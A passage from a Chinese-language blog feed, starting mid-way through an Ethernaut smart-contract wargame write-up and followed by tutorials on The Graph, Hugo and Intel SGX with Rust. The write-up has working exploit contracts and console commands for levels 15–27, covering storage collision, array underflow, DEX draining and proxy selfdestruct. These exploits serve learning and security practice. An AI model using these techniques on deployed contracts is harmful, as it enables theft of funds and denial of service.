GatekeeperTwoInterface(GatekeeperTwoContractAddress); bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1)); gatekeeper.enter(key); } } 15. Naught Coin 目標 balanceOf(player) = 0\nTransfer 有個 10 年的 lock period\n1 2 3 4 5 6 7 8 9 10 11 12 13 function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now \u0026gt; timeLock); _; } else { _; } } NaughtCoin 繼承了 openzeppelin ERC20：利用 approve() + transferFrom()\nExploit 1 2 3 totalBalance = await contract.balanceOf(player).then(v =\u0026gt; v.toString()) await contract.approve(player, totalBalance) await contract.transferFrom(player, contract.address, totalBalance) 16. Preservation 目標 owner = player\n觀察 setFirstTime 有個 delegatecall\n1 2 3 4 // set the time for timezone 1 function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } 1 2 3 4 5 6 7 8 9 contract LibraryContract { // stores a timestamp uint storedTime; function setTime(uint _time) public { storedTime = _time; } } 仔細看會發現有 storage collision，storedTime 跟 timeZone1Library 都在 slot 0，可以把 timeZone1Library 改成自己的合約，可以藉由 delegatecall 呼叫自己的合約，並利用 storage collision 改掉 owner。\n1 2 3 4 5 6 | LibraryContract Preservation Exploit ---------------------------------------------------------------------- slot 0 | storedTime \u0026lt;- timeZone1Library timeZone1Library slot 1 | _ timeZone2Library timeZone2Library slot 2 | _ owner owner slot 3 | _ storedTime Exploit 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract PreservationAttack { address public timeZone1Library; address public timeZone2Library; address public owner; function setTime(uint _time) public { owner = msg.sender; } } 1 2 await contract.setFirstTime(exp) await contract.setFirstTime(1) 17. Recovery 目標找到 simpleToken 的 address 並讓他的 ether 歸 0\n去 XXXscan 上觀察 address，利用 selfdestruct 將合約的 ether 全數轉出\n正規解法要算出 contract address\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity ^0.8.0; interface ISimpleToken { function destroy(address payable _to) external; } contract Exp { function withdraw(address _addr) public { ISimpleToken(_addr).destroy(payable(msg.sender)); } } 18. MagicNumber 目標寫出最多只能用到 10 opcodes 的合約，需回傳 magic number 42\nRuntime code return 42(0x2a)，RETURN 有 2 個參數: position、size，先將 42 存進 memory 再從 memory 讀出來並回傳\nmstore(position, value) 1 2 3 602a Push 0x2a in stack. 6050 Push 0x50 in stack. 52 Mstore return(position, size) 1 2 3 6020 Push 0x20(32 bytes) in stack. 6050 Push 0x50 in stack. f3 RETURN runtime opcodes 剛好 10 bytes\n1 602a60505260206050f3 Init code 可以部署一個合約看看長怎樣\nExploit 1 2 3 4 bytecode = \u0026#39;600a600c600039600a6000f3602a60505260206050f3\u0026#39; txn = await web3.eth.sendTransaction({from: player, data: bytecode}) solverAddr = txn.contractAddress await contract.setSolver(solverAddr) 19. Alien Codex 目標 owner = player\nAlienCodex 繼承了 Ownable，owner 必定在 Ownable-05.sol 中，storage 從 Ownable-05.sol 開始排，storage 總共有 2^256 個 slot。\n從 slot 0 開始看 owner 到底在哪個 slot\n注意 solidity 版本 0.5.0 -\u0026gt; overflow/underflow?\nDynamic array codex 的 data[0] 存放在 slot p = keccak256(1)，data[1] 在 keccak256(1)+1，以此類推。\n1 2 3 4 5 6 7 8 slot 0: contact | owner slot 1: codex.length ... slot p: codex[0] slot p+1: codex[1] ... slot 2^256-1:codex[2^256 - 1 - p] slot 0 codex[2^256 - p] 看到 retract() 可以改變 length，讓 length overflow，又因為總共只有 2^256 個 slot，必定存在 i 使得 codex[i] 存在 slot 0，可以用 revise() 改掉在 slot 0 的 owner。\n1 2 3 function retract() contacted public { codex.length--; } Exploit 1 2 3 4 5 6 await contract.make_contact() await contract.retract() p = web3.utils.keccak256(web3.eth.abi.encodeParameters([\u0026#34;uint256\u0026#34;], [1])) i = BigInt(2 ** 256) - BigInt(p) content = \u0026#39;0x000000000000000000000000\u0026#39; + player.slice(2) await contract.revise(i, content) 20. Denial 目標讓 owner 無法透過 withdraw() 成功提款\n1 2 3 4 5 6 7 8 9 10 11 // withdraw 1% to recipient and 1% to owner function withdraw() public { uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call{value:amountToSend}(\u0026#34;\u0026#34;); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); } line 7 會做 transfer，在 line 6 動手腳，call 無限制 gas 用量，透過重入或其他操作達成 revert: out of gas exception。\nExploit 新版本好像不能這樣搞了\n1 2 3 4 5 6 7 8 9 10 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract DenialAttack { fallback() external payable { // consume all the gas assert(false); } } or\n1 2 3 4 5 6 7 8 9 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract DenialAttack { fallback() external payable { while(true) {} } } 設定 parnter\n1 await contract.setWithdrawPartner(exp) 21. Shop 目標 price \u0026lt; 100\n與 11. 類似，但 price() 有 view 屬性，調用 view function，預設使用 staticcall\n1 2 3 4 5 6 7 8 function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price() \u0026gt;= price \u0026amp;\u0026amp; !isSold) { isSold = true; price = _buyer.price(); } } line 4 需回傳 \u0026gt; 100，line 6 需回傳 \u0026lt; 100，可以藉由 isSold 的改變判斷\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IShop { function buy() external; function isSold() external view returns (bool); } contract ShopAttack { function price() external view returns (uint) { return IShop(msg.sender).isSold() ? 1 : 100; } function attack(address _shopAddr) external { IShop(_shopAddr).buy(); } } 22. DEX player 有 10 token1 及 10 token2，DEX 有 100 token1 及 100 token2\n目標將 DEX 其中一種 token 清０\nswap() 利用 get_swap_price() 為 amount\n1 2 3 4 5 6 7 8 function swap(address from, address to, uint amount) public { require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026#34;Invalid tokens\u0026#34;); require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); uint swap_amount = get_swap_price(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swap_amount); IERC20(to).transferFrom(address(this), msg.sender, swap_amount); } get_swap_price() 直接用 balance 相除計算，可能會有誤差（3/2=1)\n1 2 3 function get_swap_price(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } Exploit 1 2 3 4 5 6 await contract.swap(t1, t2, 10) await contract.swap(t2, t1, 20) await contract.swap(t1, t2, 24) await contract.swap(t2, t1, 30) await contract.swap(t1, t2, 41) await contract.swap(t2, t1, 45) 23. Dex Two 榨乾 DEX 的 token1 及 token2\n與 22. 相比，swap() 缺少一行：\n1 require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026#34;Invalid tokens\u0026#34;); 所以拿別的 token 做 swap 就完事了\nExploit 1 2 3 4 5 6 7 8 9 10 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; contract EvilToken is ERC20 { constructor(uint256 initialSupply) ERC20(\u0026#34;EvilToken\u0026#34;, \u0026#34;EVL\u0026#34;) { _mint(msg.sender, initialSupply); } } 1 2 await contract.swap(evlToken1, t1, 100) await contract.swap(evlToken2, t2, 100) 24. Puzzle Wallet 目標 admin = player\n有難度的一題，幾個觀察：\napproveNewAdmin() 可改 admin，但有 modifier onlyAdmin，此路行不通 PuzzleWallet 每個 function 都有 modifier onlyWhitelisted，owner 可以加白名單 PuzzleProxy 的 pendingAdmin 跟 PuzzleWallet 的 owner 共用同一個 slot 0 maxBalance 跟 admin 都在 slot 1 透過更改 pendingAdmin 達成改 owner，成為 owner 後加白名單，改 maxBalance 為 player，admin 即為 player。\nsetMaxBalance() 卡了一個 address(this).balance == 0 要繞過\n1 2 3 4 function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { require(address(this).balance == 0, \u0026#34;Contract balance is not 0\u0026#34;); maxBalance = _maxBalance; } 先確定一下 balance\n1 2 await getBalance(contract.address) // Output: 0.001 思考在同一個交易調用2次 deposit()，因為 multicall() 共用一個 msg.value，這樣可以只轉一筆 ether 但 balance 會是2倍。\n注意到 multicall() line 9 限制 deposit 只能 call 一次\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function multicall(bytes[] calldata data) external payable onlyWhitelisted { bool depositCalled = false; for (uint256 i = 0; i \u0026lt; data.length; i++) { bytes memory _data = data[i]; bytes4 selector; assembly { selector := mload(add(_data, 32)) } if (selector == this.deposit.selector) { require(!depositCalled, \u0026#34;Deposit can only be called once\u0026#34;); // Protect against reusing msg.value depositCalled = true; } (bool success, ) = address(this).delegatecall(data[i]); require(success, \u0026#34;Error while delegating call\u0026#34;); } } 繞過 line 9: 在 multicall 裡面包 2 multicall，裡面分別調用 deposit()\n原本想法：\n1 2 multicall -\u0026gt; deposit -\u0026gt; deposit 變成：\n1 2 multicall -\u0026gt; multicall -\u0026gt; deposit -\u0026gt; multicall -\u0026gt; deposit Exploit 調用 proposeNewAdmin() 1 2 3 4 5 6 7 8 9 10 11 12 13 Signature = { name: \u0026#39;proposeNewAdmin\u0026#39;, type: \u0026#39;function\u0026#39;, inputs: [ { type: \u0026#39;address\u0026#39;, name: \u0026#39;_newAdmin\u0026#39; } ] } params = [player] data = web3.eth.abi.encodeFunctionCall(Signature, params) await web3.eth.sendTransaction({from: player, to: instance, data}) 調用 addToWhitelist() 利用 multicall deposit() twice execute() 領錢 setMaxBalance() 設為 player 1 2 3 4 5 6 await contract.addToWhitelist(player) depositData = await contract.methods[\u0026#34;deposit()\u0026#34;].request().then(v =\u0026gt; v.data) multicallData = await contract.methods[\u0026#34;multicall(bytes[])\u0026#34;].request([depositData]).then(v =\u0026gt; v.data) await contract.multicall([multicallData, multicallData], {value: toWei(\u0026#39;0.001\u0026#39;)}) await contract.execute(player, toWei(\u0026#39;0.002\u0026#39;), 0x0) await contract.setMaxBalance(player) 25. Motorbike selfdestruct the engine\nEIP-1967 Standard Proxy Storage Slots implementation 和 admin，分别存邏輯合約地址和管理員地址 如果放在 slot 0、slot 1，可能會有 storage collision 的問題 EIP-1967 提出把 implementation 和 admin 放在了兩個特殊的 slot 中 1 2 // keccak-256 hash of \u0026#34;eip1967.proxy.implementation\u0026#34; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; Engine 合約中無 selfdestruct，但 _upgradeToAndCall() 中有個 delegatecall，可以透過他呼叫 selfdestruct。\n先找一下 engine 合約的地址，存在 slot _IMPLEMENTATION_SLOT 中：\n1 Addr = await web3.eth.getStorageAt(contract.address, \u0026#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\u0026#39;) 原則上 engine 只負責邏輯，因此應當沒有被初始化過，可調用 initialize() 做初始化。 接著 upgradeToAndCall()，完成 selfdestruct。\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 // SPDX-License-Identifier: MIT pragma solidity \u0026lt;0.7.0; import \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; contract MotorbikeAttack { // Address of current implementation (The Engine) address public implementation; event Check(bool result); constructor(address impl) public { implementation = impl; } function takeControl() external returns(bytes memory) { // take control over the Engine Address.functionCall(implementation, abi.encodeWithSignature(\u0026#34;initialize()\u0026#34;)); } function destroy() external { // Upgrade the engine to a contract that selfdestruct once initialized Exploit exploit = new Exploit(); Address.functionCall( implementation, abi.encodeWithSignature( \u0026#34;upgradeToAndCall(address,bytes)\u0026#34;, address(exploit), abi.encodeWithSignature(\u0026#34;initialize()\u0026#34;) ) ); } function validateItIsBroken() external { emit Check(Address.isContract(implementation)); } } contract Exploit { function initialize() external { selfdestruct(msg.sender); } } 26. Double Entry Point 自己寫個 forta bot\n需實作 handleTransaction()\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 pragma solidity ^0.8.0; interface IForta { function raiseAlert(address user) external; } contract MyDetectionBot { function handleTransaction(address user, bytes calldata msgData) external { IForta(msg.sender).raiseAlert(user); } } 設定 bot\n1 2 3 4 5 6 7 8 9 10 11 botAddr = \u0026#39;0x...\u0026#39; forta = await contract.forta() setBotSig = web3.eth.abi.encodeFunctionCall({ name: \u0026#39;setDetectionBot\u0026#39;, type: \u0026#39;function\u0026#39;, inputs: [ { type: \u0026#39;address\u0026#39;, name: \u0026#39;detectionBotAddress\u0026#39; } ] }, [botAddr]) await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig }) 27. Good Samaritan 清空 wallet 的 balance\n一直 request 顯然不是正解\ntarnsfer() 會進 notify()，dest_ 可以自行指定，可能可以做一些事\n1 2 3 4 if(dest_.isContract()) { // notify contract INotifyable(dest_).notify(amount_); } line 8 把錢全部轉給 msg.sender，cool，這就是我們要的，於是在 notify 裡面寫個 err NotEnoughBalance() 就行。\n1 2 3 4 5 6 7 8 9 10 11 12 function requestDonation() external returns(bool enoughBalance){ // donate 10 coins to requester try wallet.donate10(msg.sender) { return true; } catch (bytes memory err) { if (keccak256(abi.encodeWithSignature(\u0026#34;NotEnoughBalance()\u0026#34;)) == keccak256(err)) { // send the coins left wallet.transferRemainder(msg.sender); return false; } } } Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;../levels/GoodSamaritan.sol\u0026#34;; error NotEnoughBalance(); contract GoodSamaritanAttack { function attack(address _goodSamaritan) external { GoodSamaritan(_goodSamaritan).requestDonation(); } function notify(uint256 amount_) external pure { if(amount_ \u0026lt;= 10) { revert NotEnoughBalance(); } } } ","date":"2022-08-26T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/ethernaut-writeup/","title":"Ethernaut Writeup"},{"content":"前言 開開心心學 the graph\n從 subgraph 撰寫、搭建本地 graph node 到部署 subgraph\nIntroduction The Graph is a decentralized protocol for indexing and querying data from blockchains, starting with Ethereum.\nThe graph 為一個去中心化索引協議，用於索引和查詢區塊鏈的數據。\nIt makes it possible to query data that is difficult to query directly.\nThe graph 使那些難以直接查詢的數據變成可能。\n舉例來說，我們想要取得某個用戶在 Uniswap 在各個 pool 有多少資產，過去可以透過連接鏈上 endpoint、發起 RPC call、調用合約接口達成。具體來說：\n取得總共有幾個 pool 取得所有 pool 的合約地址 遍歷所有 pool 合約取得該用戶的 balance 但是這麼做有幾個缺點：\nendpoint 的 request 時間可能較長 需發出多個 RPC call，畢竟可是有好幾百個 pool\u0026hellip; 以上例子利用 the graph 的話只需要一個 query 就能達成:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { users(where: {id:\u0026#34;0x4de7009354f32b950052d4556695c04449820849\u0026#34;}) { id liquidityPositions{ liquidityTokenBalance pair { token0 { symbol totalSupply } token1 { symbol totalSupply } } } } } 可以搭配 Debank 看看結果\nThe graph 除了可以解決某些情境的效能瓶頸，有時候根據合約接口甚至沒辦法取得我們需要的數據，所以需要根據需求提前構建索引，the graph 則會根據規則索引鏈上數據，使用者可以透過 GraphQL API 查詢數據。\n題外話， multicall 可以參考兔子哥：https://github.com/banteg/multicall.py\nThe graph protocol The Graph 根據子圖描述（subgraph manifest）來學習什麼以及如何索引鏈上數據。Subgraph manifest 定義了子圖的 data source (智能合約)，以及此合約要處理的 event，還有如何將 event 數據 mapping 到資料庫。\n查詢及索引都是透過 graph node 完成，啟動後會連接區塊鏈節點及 IPFS。\n以下舉個例子：\n定義了一個會記錄某 token 所有 transfer event 的子圖。 用戶透過一筆 transaction 轉了 token 給另一個人（transfer)。 當合約處理此交易的時候觸發了 transfer event。 Graph node 持續掃描區塊。 當某區塊包含 transfer event，graph node 會執行 mapping 處理程序，並將處理好的資料儲存。 透過 GraphQL API 可以查詢到索引下來的數據。 Graph node 部署 Running a graph node using Docker https://github.com/graphprotocol/graph-node/tree/master/docker\n注意，使用 Macbook M1 請見此連結重新 build image: https://github.com/graphprotocol/graph-node/tree/v0.26.0/docker#running-graph-node-on-an-macbook-m1\n1 2 3 git clone https://github.com/graphprotocol/graph-node.git cd docker docker-compose up Running a local graph node rust 安装\n1 curl --proto \u0026#39;=https\u0026#39; --tlsv1.2 https://sh.rustup.rs -sSf | sh Postgresql 安装\n1 brew install postgresql IPFS 安裝\n1 brew install ipfs Start Up an IPFS Node\n1 2 ipfs init ipfs daemon Create the Postgres databas\n1 2 3 initdb -D .postgres pg_ctl -D .postgres -l logfile start createdb graph-node Start the Graph Node\n1 2 3 4 5 6 git clone https://github.com/graphprotocol/graph-node.git cd graph-node cargo run -p graph-node --release -- \\ --postgres-url postgresql://USERNAME:PASSWORD@127.0.0.1:5432/graph-node \\ --ethereum-rpc mainnet:\u0026lt;ETHEREUM_RPC\u0026gt; \\ --ipfs 127.0.0.1:5001 Try your OS username as USERNAME and PASSWORD\nSubgraph 以 WETH token 為例： https://github.com/ashirleyshe/subgraph/tree/main/weth-erc20\n於 Subgraph studio 的部署：https://api.studio.thegraph.com/query/27930/weth-subgraph/v0.1.1/graphql\n需要寫的部分：\nsubgraph.yaml: subgraph manifest schema.graphql: GraphQL schema 定義子圖資料(entity)如何儲存及如何透過 GraphQL query AssemblyScript Mappings: AssemblyScript code 將 event data 轉成 schema 中的 entity Reference: https://docs.openzeppelin.com/subgraphs/0.1.x/\n使用 Openzeppelin subgraph library\n當要支援多個 erc20 時，編寫 manifest 可以藉由套件完成(@amxx/graphprotocol-utils):\n先準備config，裡面填寫 datasource 也就是 token address，範例：https://github.com/OpenZeppelin/openzeppelin-subgraphs/blob/main/configs/top-erc20.json\n生成 schema 及 manifest\n1 2 3 4 5 npx graph-compiler \\ --config sample.json \\ --include node_modules/@openzeppelin/subgraphs/src/datasources \\ --export-schema \\ --export-subgraph 部署 subgraph package.json 在 script 中增加 \u0026ldquo;create-local\u0026rdquo; \u0026ldquo;remove-local\u0026rdquo; \u0026ldquo;deploy-local\u0026rdquo; 方便後續部署\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 { \u0026#34;name\u0026#34;: \u0026#34;gravity\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;UNLICENSED\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;codegen\u0026#34;: \u0026#34;graph codegen\u0026#34;, \u0026#34;build\u0026#34;: \u0026#34;graph build\u0026#34;, \u0026#34;deploy\u0026#34;: \u0026#34;graph deploy --node https://api.studio.thegraph.com/deploy/ gravity\u0026#34;, \u0026#34;create-local\u0026#34;: \u0026#34;graph create --node http://127.0.0.1:8020/ gravity\u0026#34;, \u0026#34;remove-local\u0026#34;: \u0026#34;graph remove --node http://127.0.0.1:8020/ gravity\u0026#34;, \u0026#34;deploy-local\u0026#34;: \u0026#34;graph deploy --node http://127.0.0.1:8020/ --ipfs http://127.0.0.1:5001 gravity\u0026#34; }, \u0026#34;dependencies\u0026#34;: { \u0026#34;@graphprotocol/graph-cli\u0026#34;: \u0026#34;0.29.2\u0026#34;, \u0026#34;@graphprotocol/graph-ts\u0026#34;: \u0026#34;0.26.0\u0026#34; } } 1 2 3 4 5 6 7 8 9 10 yarn # Code Generation yarn codegen # Build yarn build yarn create-local yarn deploy-local 完成 subgraph 部署后，便會從某個區塊開始構建索引\nChecking Subgraph health https://thegraph.com/docs/hostedservice/deploy-subgraph-hosted#checking-subgraph-health\nsubgraph sync status 可以在這邊看到：預設 port 8030/subgraph\nExample query:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 { indexingStatusForCurrentVersion(subgraphName: \u0026#34;org/subgraph\u0026#34;) { synced health fatalError { message block { number hash } handler } chains { chainHeadBlock { number } latestBlock { number } } } } Performance Improvement Two Simple Subgraph Performance Improvements\nhttps://medium.com/edge-node-engineering/two-simple-subgraph-performance-improvements-a76c6b3e7eac\nUsing immutable entities and Bytes as the id\nGraph Node Environment Variables\nhttps://github.com/graphprotocol/graph-node/blob/master/docs/environment-variables.md CallHandler\nThe graph 官方推薦使用 EventHandler 就好，使用 CallHandler 可能導致同步效率緩慢。 Substreams\nhttps://thegraph.com/blog/substreams-parallel-processing 原先的 RPC-based Subgraphs 使用 linear indexing model (一個 event 處理完才能處理下一個) Substreams take things even further by enabling massively parallelized streaming data. 一些坑 HTTP error creating the subgraph: ECONNREFUSED 1 2 3 4 5 6 7 ➜ weth-erc20 yarn create-local yarn run v1.22.19 warning ../package.json: No license field $ graph create --node http://localhost:8020/ weth-erc20 ✖ HTTP error creating the subgraph: ECONNREFUSED error Command failed with exit code 1. info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command. → localhost 改成 127.0.0.1 即可\nFailed to get entities from store: column c.block$ does not exist 1 2 3 4 5 6 7 { \u0026#34;errors\u0026#34;: [ { \u0026#34;message\u0026#34;: \u0026#34;Failed to get entities from store: column c.block$ does not exist, query = /* qid: 431b3891025ffb2d-6dc8c4ef99f8cc6a */\\nselect \u0026#39;ERC20Deposit\u0026#39; as entity, to_jsonb(c.*) as data from (select * \\n from \\\u0026#34;sgd33\\\u0026#34;.\\\u0026#34;erc20_deposit\\\u0026#34; c\\n where c.block$ \u0026lt;= $1\\n\\n order by \\\u0026#34;id\\\u0026#34;\\n limit 100) c -- binds: [4752680]\u0026#34; } ] } → graph node bug 新版本已修復\nhttps://github.com/graphprotocol/graph-node/issues/3553\ngraph-ts graph-cli 版本 每個 subgraph 要額外定義，每個版本可能不一樣TT\nReference https://thegraph.com/docs/en/about/introduction/ https://github.com/graphprotocol/graph-node https://thegraph.academy/developers/defining-a-subgraph/ ","date":"2022-06-20T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/the-graph-%E5%8D%80%E5%A1%8A%E9%8F%88%E6%95%B8%E6%93%9A%E7%B4%A2%E5%BC%95%E5%8D%94%E8%AD%B0/","title":"The graph - 區塊鏈數據索引協議"},{"content":"Install 1 brew install hugo Check the version 1 hugo version Create a New Site 1 hugo new site XXX Add Posts 1 hugo new posts/XXX.md Start the Hugo server 1 2 # Draft hugo server -D Navigate to your new site at http://localhost:1313/.\nBuild 1 2 3 hugo -D # or hugo Output will be in ./public/ directory by default.\nAdd Disqus Go to Disqus: https://disqus.com/ Get started -\u0026gt; I want to install Disqus on my site config.yml 設定 disqusShortname 1 2 # Change it to your Disqus shortname before using disqusShortname: xxx 新增 layouts/partials/disqus.html 並貼上： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div id=\u0026#34;disqus_thread\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; (function() { // Don\u0026#39;t ever inject Disqus on localhost--it creates unwanted // discussions from \u0026#39;localhost:1313\u0026#39; on your Disqus account... if (window.location.hostname == \u0026#34;localhost\u0026#34;) return; var dsq = document.createElement(\u0026#39;script\u0026#39;); dsq.type = \u0026#39;text/javascript\u0026#39;; dsq.async = true; var disqus_shortname = \u0026#39;{{ .Site.DisqusShortname }}\u0026#39;; dsq.src = \u0026#39;//\u0026#39; + disqus_shortname + \u0026#39;.disqus.com/embed.js\u0026#39;; (document.getElementsByTagName(\u0026#39;head\u0026#39;)[0] || document.getElementsByTagName(\u0026#39;body\u0026#39;)[0]).appendChild(dsq); })(); \u0026lt;/script\u0026gt; \u0026lt;noscript\u0026gt;Please enable JavaScript to view the \u0026lt;a href=\u0026#34;https://disqus.com/?ref_noscript\u0026#34;\u0026gt;comments powered by Disqus.\u0026lt;/a\u0026gt;\u0026lt;/noscript\u0026gt; \u0026lt;a href=\u0026#34;https://disqus.com/\u0026#34; class=\u0026#34;dsq-brlink\u0026#34;\u0026gt;comments powered by \u0026lt;span class=\u0026#34;logo-disqus\u0026#34;\u0026gt;Disqus\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; Reference https://gohugo.io/getting-started/quick-start/ https://gohugo.io/templates/internal/#disqus\n","date":"2021-10-22T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/hugo-quick-start/","title":"Hugo Quick Start"},{"content":"前言 Intel Software Guard Extensions(Intel SGX) 提供以硬體為基礎的可信執行環境，與 ARM TrustZone 類似，可在記憶體內隔離特定的應用程式碼與資料，保護隱密資料不會被惡意程式攻擊或竊取。 它允許用戶於記憶體中建立私有區域，稱為「指定位址空間」(enclave)，程式碼可於 enclave 中執行， 與其他運行在相同或更高權限級別的程式有效隔離。\nIntel SGX \u0026amp; Enclave Intel SGX 為於 x86 實作 enclave 的 instruction set extension。 Enclave 為程式提供了一個安全的執行環境，不受外界干擾。 該環境建立在三個關鍵點上：\nFully isolated execution 通常在執行程式時，會有大量程式比你的程式擁有更多的特權：像是作業系統等等。他們可以從記憶體中讀取 secret，在其他機器上創建你的程式的副本，並修改你的程式的工作方式。 而在 enclave 中運行的程式與系統的其餘部分完全隔離。一旦 enclave 被加載，保存在 enclave 中的程式和數據就不會被修改，初始記憶體內容代表 enclave 的身份(identity)，如果更改 enclave 的程式，其身份也會更改。\n使用 Intel SGX 的應用程式會分為兩個部分：\n可信部分（Trusted component）：也就是 enclave。 不受信任部分（Untrusted component）：這是應用程式的其餘部分及其任何模塊。從 enclave 的角度來看，OS 和 VMM 被視為不受信任的部分。 Sealing 資料並不會永久的儲存在 enclave 中。 Sealing 為將數據加密的過程，以便將數據儲存在不受信任的地方。 Enclave 會獲得和自己身份和 CPU 相關的密鑰，此密鑰稱為密封密鑰（sealing key)，它可用於加密數據（sealed blob），以後在完全相同的 CPU 上運行的完全相同的 enclave 程式就能解密數據。\n若程式改變，身份會改變，sealing key 也會不同。 如果程式運行在不同的 CPU 上，sealing key 也會不同。\nExample: Obtaining a sealing key Remote attestation 遠端證明用來確定遠端系統完整性，確定其是否可信。在 SGX 中，enclave 可以使用遠端證明提供其身份及其執行環境的證明，表示硬體有確實使用 SGX 執行特定的 enclave。該證明為由 CPU 使用其私鑰簽署的數位簽章，此私鑰只能用於遠端證明，並可以使用公鑰驗證簽名。\nAttesatation 也有 local attestation，即為在同一機器兩個 enclave 互相認證的過程。\nExample: Local attestation Rust EDP 選擇 Rust EDP 來寫 SGX 程式還是因為寫起來比較親民，否則需要寫可信區跟不可信區的程式，好麻煩\u0026hellip;\nInstallation 先看一下 CPU 能不能支援 Intel SGX: 如何知道我的 Intel® 處理器是否支援 Intel® Software Guard Extensions （Intel® SGX）\n環境 Ubuntu 18.04 Install Rust 1 curl --proto \u0026#39;=https\u0026#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh 1 2 3 4 5 6 7 1) Proceed with installation (default) 2) Customize installation 3) Cancel installation \u0026gt;2 ... Default toolchain? (stable/beta/nightly/none) nightly Install nightly toolchain 1 rustup default nightly Install EDP components 1 rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly Install SGX driver 1 2 3 echo \u0026#34;deb https://download.fortanix.com/linux/apt xenial main\u0026#34; | sudo tee -a /etc/apt/sources.list.d/fortanix.list \u0026gt;/dev/null curl -sSL \u0026#34;https://download.fortanix.com/linux/apt/fortanix.gpg\u0026#34; | sudo -E apt-key add sudo apt-get update sudo apt-get install intel-sgx-dkms Install AESM service 1 2 3 echo \u0026#34;deb https://download.01.org/intel-sgx/sgx_repo/ubuntu $(lsb_release -cs) main\u0026#34; | sudo tee -a /etc/apt/sources.list.d/intel-sgx.list \u0026gt;/dev/null curl -sSL \u0026#34;https://download.01.org/intel-sgx/sgx_repo/ubuntu/intel-sgx-deb.key\u0026#34; | sudo -E apt-key add sudo apt-get update sudo apt-get install sgx-aesm-service libsgx-aesm-launch-plugin Install Fortanix EDP utilities 1 2 sudo apt-get install pkg-config libssl-dev protobuf-compiler cargo install fortanix-sgx-tools sgxs-tools Configure Cargo integration with Fortanix EDP Create .cargo directory with config file in it, in your $HOME directory with the following content:\n1 2 [target.x86_64-fortanix-unknown-sgx] runner = \u0026#34;ftxsgx-runner-cargo\u0026#34; Check your SGX setup 1 sgx-detect Run your enclave! 1 2 3 cargo new --bin hello-world cd hello-world cargo run --target x86_64-fortanix-unknown-sgx 就像寫一般的 Rust 程式，只差別在 Running 時候的指令。\n目錄結構 1 2 3 4 5 6 hello-world/ ├── Cargo.lock ├── Cargo.toml # 套件管理 ├── src │ └── main.rs # 你的程式 └── target Architecture EDP 提供了介面去啟動 enclave 並由 encalve 取得輸出。 enclave-runner 負責加載 enclave。\nftxsgx-runner 是基於 enclave-runner 的執行檔，也可以自己寫。\nDeployment 我們需要將執行檔轉換成 .sgxs 的格式，因為編譯器沒辦法直接輸出 .sgxs ，所以先編譯再轉換過去。\nBuild 1 cargo build --target x86_64-fortanix-unknown-sgx SGXS conversion 1 ftxsgx-elf2sgxs myapp --heap-size 0x20000 --stack-size 0x20000 --threads 10 --debug 要特別注意 stack size 以及 heap size 的調整。 如果大小給太小可能會導致 enclave 停止運行：\n1 2 Error while executing SGX enclave. Enclave panicked: memory allocation of 590032 bytes failed 但如果大小給太大也會增加 enclave 載入時間，降低效率。\nSign enclave 在執行前是必需要被簽名的。\n1 2 3 4 5 # 使用 \u0008OpenSSL 產生 signing key: openssl genrsa -3 3072 \u0026gt; my_key.pem # To sign an 